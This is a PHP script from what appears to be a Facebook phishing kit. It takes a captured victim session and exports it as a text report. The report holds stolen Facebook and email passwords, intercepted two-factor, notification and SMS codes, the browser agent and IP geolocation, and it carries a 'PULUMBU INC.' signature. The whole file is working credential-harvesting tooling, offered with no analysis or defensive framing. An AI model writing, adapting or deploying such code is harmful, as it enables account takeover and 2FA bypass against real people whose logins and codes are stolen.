<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['save_details'])) {
    $id = $_POST['id'];
    $userData = json_decode(file_get_contents("sessions/$id.json"), true);

    $details = "==========> New Facebook Details <==========\n\n";
    $details .= "ID: $id\n";
    $details .= "IP Address: {$userData['ip']}\n\n";
    $details .= "|=====> First Attempt <=====}\n";
    $details .= "User: {$userData['user']}\n";
    $details .= "Pass: {$userData['pass']}\n\n";
    $details .= "|=====> Second Attempt <=====}\n";
    $details .= "User: " . (isset($userData['failed_user']) ? $userData['failed_user'] : 'N/A') . "\n";
    $details .= "Pass: " . (isset($userData['failed_pass']) ? $userData['failed_pass'] : 'N/A') . "\n\n";
    $details .= "|=====> Email Access <=====}\n";
    $details .= "User: " . (isset($userData['email_user']) ? $userData['email_user'] : 'N/A') . "\n";
    $details .= "Pass: " . (isset($userData['email_pass']) ? $userData['email_pass'] : 'N/A') . "\n\n";
    $details .= "|=====> Codes <=====}\n";
    $details .= "Authentication: " . (isset($userData['auth_code']) ? $userData['auth_code'] : 'N/A') . "\n";
    $details .= "Notification: " . (isset($userData['alert_code']) ? $userData['alert_code'] : 'N/A') . "\n";
    $details .= "SMS: " . (isset($userData['sms_code']) ? $userData['sms_code'] : 'N/A') . "\n\n";
    $details .= "|=====> Browser Agent <=====|\n";
    $details .= "Browser: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";
    $details .= "|=======> IP Details <=======|\n";
    $details .= "Status: " . (isset($userData['ip_details']['status']) ? $userData['ip_details']['status'] : 'N/A') . "\n";
    $details .= "Country: " . (isset($userData['ip_details']['country']) ? $userData['ip_details']['country'] : 'N/A') . "\n";
    $details .= "Country Code: " . (isset($userData['ip_details']['countryCode']) ? $userData['ip_details']['countryCode'] : 'N/A') . "\n";
    $details .= "Region: " . (isset($userData['ip_details']['region']) ? $userData['ip_details']['region'] : 'N/A') . "\n";
    $details .= "Region Name: " . (isset($userData['ip_details']['regionName']) ? $userData['ip_details']['regionName'] : 'N/A') . "\n";
    $details .= "City: " . (isset($userData['ip_details']['city']) ? $userData['ip_details']['city'] : 'N/A') . "\n";
    $details .= "ZIP: " . (isset($userData['ip_details']['zip']) ? $userData['ip_details']['zip'] : 'N/A') . "\n";
    $details .= "Latitude: " . (isset($userData['ip_details']['lat']) ? $userData['ip_details']['lat'] : 'N/A') . "\n";
    $details .= "Longitude: " . (isset($userData['ip_details']['lon']) ? $userData['ip_details']['lon'] : 'N/A') . "\n";
    $details .= "Timezone: " . (isset($userData['ip_details']['timezone']) ? $userData['ip_details']['timezone'] : 'N/A') . "\n";
    $details .= "ISP: " . (isset($userData['ip_details']['isp']) ? $userData['ip_details']['isp'] : 'N/A') . "\n";
    $details .= "Organization: " . (isset($userData['ip_details']['org']) ? $userData['ip_details']['org'] : 'N/A') . "\n";
    $details .= "AS: " . (isset($userData['ip_details']['as']) ? $userData['ip_details']['as'] : 'N/A') . "\n";
    $details .= "Query: " . (isset($userData['ip_details']['query']) ? $userData['ip_details']['query'] : 'N/A') . "\n";
    $details .= "==============================\n\n";
    $details .= "|=======> PULUMBU INC. <=======|\n";

    header('Content-Type: text/plain');
    header('Content-Disposition: attachment; filename="user_details_' . $id . '.txt"');
    echo $details;
    exit();
}
?>